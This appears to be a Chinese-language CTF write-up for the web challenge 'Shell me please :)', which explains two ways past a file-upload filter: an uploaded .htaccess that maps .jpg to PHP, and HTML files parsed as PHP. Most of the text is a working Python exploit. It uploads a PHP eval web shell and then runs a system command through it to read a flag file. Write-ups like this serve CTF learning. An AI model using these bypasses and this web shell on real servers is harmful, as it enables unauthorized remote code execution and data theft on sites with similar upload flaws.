## Web — Shell me please :)
### 考点
文件上传（.htaccess / html解析php）

### 解题思路

![](https://ws1.sinaimg.cn/large/006tNc79ly1g4awg4zikpj31ai0u0x6r.jpg)

随便输入，发现有回显当前输入，可以hint  `f* put content` 大概率可以猜到是`file_put_content()`

简单绕过之后，发现文件上传

![image-20190623105407994](https://ws4.sinaimg.cn/large/006tNc79ly1g4awicj6zsj315a0u07wk.jpg)

#### 解法一 .htaccess

因为后缀名黑名单很容易就能绕过，所以先上传一个.htaccess文件

```
AddType application/x-httpd-php .jpg
```

然后，在上传一个含有恶意脚本的 `.jpg` 即可getshell。

#### 解法二 html解析php

经过测试是可以发现，首页是`index.html`而不是`index.php`，然后上传点，做了黑名单后缀名过滤和MIME白名单，但是上传HTML也在白名单里，所以可以直接上传含恶意脚本的 `.html` 文件，即可getshell。



#### EXP

```python
# -*- coding: utf-8 -*-
# @Author: 0aKarmA_骅文
# @Date:   2019-06-23 23:15:09
# @Last Modified by:   0aKarmA
# @Last Modified time: 2019-06-24 09:46:40
import requests, re


def vulhtml(url):
    vul = url + "?text[]=123"
    files = {'uploaded':('0aKarmA.html', bytes("<?php @eval($_POST['1']); ?>", encoding="utf-8"), 'text/html')}
    verify = requests.get(vul)
    verify = "".join(re.findall(r'verify" value="(.*)"', verify.text))
    data = {'verify':verify, 'Upload':'Upload'}
    requests.post(vul, files=files, data=data)
    flag = requests.post(url + "uploads/" + verify + "_0aKarmA.html", data={'1':'system("cat ../include/flag");'})
    print(flag.text)

def vulhtaccess(url):
    vul = url + "?text[]=123"
    files = {'uploaded':('.htaccess', bytes("AddType application/x-httpd-php .jpg", encoding="utf-8"), 'application/octet-stream')}
    verify = requests.get(vul)
    verify = "".join(re.findall(r'verify" value="(.*)"', verify.text))
    data = {'verify':verify, 'Upload':'Upload'}
    # upload .htaccess
    requests.post(vul, files=files, data=data, proxies={'http':'http:127.0.0.1:8080'})
    # upload jpg
    files = {'uploaded':('0aKarmA.jpg', bytes("<?php @eval($_POST['1']); ?>", encoding="utf-8"), 'image/jpg')}
    verify = requests.get(vul)
    verify = "".join(re.findall(r'verify" value="(.*)"', verify.text))
    data = {'verify':verify, 'Upload':'Upload'}
    requests.post(vul, files=files, data=data)
    flag = requests.post(url + "uploads/" + verify + "_0aKarmA.jpg", data={'1':'system("cat ../include/flag");'})
    print(flag.text)


if __name__ == '__main__':
    url = "ip"
    
    # vulhtml(url)
    vulhtaccess(url)
```

